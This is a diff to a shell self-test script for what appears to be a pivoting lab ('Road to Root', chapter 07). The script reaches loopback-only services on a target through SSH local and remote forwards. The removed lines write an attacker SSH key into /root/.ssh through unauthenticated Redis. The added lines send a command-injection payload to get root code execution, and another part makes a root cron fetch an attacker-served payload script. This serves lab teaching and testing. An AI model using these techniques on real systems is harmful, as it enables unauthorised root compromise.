@@ -2,9 +2,10 @@
 # =============================================================================
 #  Road to Root — Pivot lab self-test (Chapter 07 "Local Service + Port Fwd")
 #
-#  Runs on the ATTACKER box and exercises BOTH forwarding directions:
-#    A  LOCAL forward (-L): reach the target's loopback Redis (root, no auth),
-#       make it write /root/.ssh/authorized_keys, then ssh in as root.
+#  Runs on the ATTACKER box and exercises BOTH forwarding directions, both
+#  ending in RCE as root:
+#    A  LOCAL forward (-L): reach the target's loopback diagnostics web app
+#       (root, command injection), inject a command -> RCE as root.
 #    B  REMOTE forward (-R): a root "updater" cron on the target fetches
 #       http://127.0.0.1:9000/payload.sh; publish our own web server onto the
 #       target's loopback with -R so root runs our script.
@@ -23,7 +24,7 @@ P=0; F=0
 pass(){ echo "  [PASS] $1"; P=$((P + 1)); }
 fail(){ echo "  [FAIL] $1"; F=$((F + 1)); }
 
-echo "== target: $HOST  (loopback Redis + loopback updater) =="
+echo "== target: $HOST  (loopback web app + loopback updater) =="
 
 echo "== wait for ssh on the target =="
 up=0
@@ -33,36 +34,30 @@ for i in $(seq 1 60); do
 done
 [ "$up" = 1 ] && echo "  ssh is up" || { echo "  [FAIL] target ssh never came up"; exit 1; }
 
-echo "== control: Redis must NOT be reachable without a tunnel =="
-if redis-cli -h "$HOST" -p 6379 ping 2>/dev/null | grep -q PONG; then
-  echo "  [WARN] Redis answered directly — it should be loopback-only"
+echo "== control: the diagnostics app must NOT be reachable without a tunnel =="
+if curl -fs --max-time 4 "http://$HOST:8080/" 2>/dev/null | grep -q diagnostics; then
+  echo "  [WARN] the app answered directly — it should be loopback-only"
 else
-  echo "  [PASS] Redis is not directly reachable (loopback-only)"
+  echo "  [PASS] the app is not directly reachable (loopback-only)"
 fi
 
 # ---------------------------------------------------------------------------
-echo "== Station A — LOCAL forward (-L):  ssh -L 6379:127.0.0.1:6379 =="
-pkill -f 'ssh .* -L 6379' 2>/dev/null || true
-sshpass -p "$PASS" ssh $SSHO -f -N -L 6379:127.0.0.1:6379 "labuser1@$HOST"
+echo "== Station A — LOCAL forward (-L):  ssh -L 8080:127.0.0.1:8080 =="
+pkill -f 'ssh .* -L 8080' 2>/dev/null || true
+sshpass -p "$PASS" ssh $SSHO -f -N -L 8080:127.0.0.1:8080 "labuser1@$HOST"
 sleep 2
-if redis-cli -h 127.0.0.1 -p 6379 ping 2>/dev/null | grep -q PONG; then
-  echo "  tunnel up — Redis reachable at 127.0.0.1:6379 on the attacker"
+if curl -fs --max-time 5 "http://127.0.0.1:8080/" 2>/dev/null | grep -q diagnostics; then
+  echo "  tunnel up — the diagnostics app is reachable at 127.0.0.1:8080"
 else
-  echo "  [FAIL] could not reach Redis through the local forward"; fail "A  local forward to Redis"
+  echo "  [FAIL] could not reach the app through the local forward"; fail "A  local forward to web app"
 fi
-R(){ redis-cli -h 127.0.0.1 -p 6379 "$@"; }
-rm -f /tmp/pivkey /tmp/pivkey.pub
-ssh-keygen -t ed25519 -f /tmp/pivkey -N '' -q
-R flushall >/dev/null
-printf '\n\n%s\n\n' "$(cat /tmp/pivkey.pub)" | R -x set pwn >/dev/null
-R config set dir /root/.ssh >/dev/null
-R config set dbfilename authorized_keys >/dev/null
-R save >/dev/null
-A_OUT="$(ssh $SSHO -i /tmp/pivkey "root@$HOST" 'id; cat /root/flag.txt' 2>/dev/null)"
-echo "$A_OUT" | grep -q "$FLAG" \
-  && pass "A  -L -> Redis -> authorized_keys -> root  ($(echo "$A_OUT" | grep -o 'R2R{[^}]*}'))" \
-  || fail "A  -L -> Redis -> authorized_keys -> root"
-pkill -f 'ssh .* -L 6379' 2>/dev/null || true
+# command injection in the host parameter -> RCE as root
+A_OUT="$(curl -fs --max-time 8 -G 'http://127.0.0.1:8080/ping' \
+  --data-urlencode 'host=127.0.0.1; id; cat /root/flag.txt' 2>/dev/null)"
+echo "$A_OUT" | grep -q "$FLAG" && echo "$A_OUT" | grep -q 'uid=0(root)' \
+  && pass "A  -L -> command injection -> RCE as root  ($(echo "$A_OUT" | grep -o 'R2R{[^}]*}'))" \
+  || fail "A  -L -> command injection -> RCE as root"
+pkill -f 'ssh .* -L 8080' 2>/dev/null || true
 
 # ---------------------------------------------------------------------------
 echo "== Station B — REMOTE forward (-R):  publish our server onto target:9000 =="
@@ -74,7 +69,6 @@ sleep 1
 pkill -f 'ssh .* -R 9000' 2>/dev/null || true
 sshpass -p "$PASS" ssh $SSHO -f -N -R 9000:127.0.0.1:8000 "labuser1@$HOST"
 sleep 2
-# sanity: from the target, the loopback updater URL now reaches our server
 if sshpass -p "$PASS" ssh $SSHO "labuser1@$HOST" 'curl -fs --max-time 5 http://127.0.0.1:9000/payload.sh' 2>/dev/null | grep -q flag_b; then
   echo "  remote forward up — target's 127.0.0.1:9000 now hits our web server"
 else
